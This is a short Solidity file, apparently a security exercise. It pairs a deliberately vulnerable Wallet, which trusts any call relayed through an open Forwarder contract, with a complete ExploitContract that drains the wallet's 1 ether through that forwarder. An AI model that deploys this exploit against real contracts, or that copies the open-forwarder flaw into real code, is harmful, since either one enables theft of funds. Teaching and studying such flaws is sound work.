// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

contract Wallet {
    address public immutable forwarder;

    constructor(address _forwarder) payable {
        require(msg.value == 1 ether);
        forwarder = _forwarder;
    }

    function sendEther(address destination, uint256 amount) public {
        require(msg.sender == forwarder, "sender must be forwarder contract");
        (bool success, ) = destination.call{value: amount}("");
        require(success, "failed");
    }
}

contract Forwarder {
    function functionCall(address a, bytes calldata data) public {
        (bool success, ) = a.call(data);
        require(success, "forward failed");
    }
}

// add your exploiter contract here
contract ExploitContract {
    /**
     * easy call forwarding to drain Wallet
     */
    function exploit(Forwarder forwarder, address wallet) public {
        bytes memory data = abi.encodeWithSignature(
            "sendEther(address,uint256)",
            address(this),
            1 ether
        );
        forwarder.functionCall(wallet, data);
    }

    receive() external payable {}
}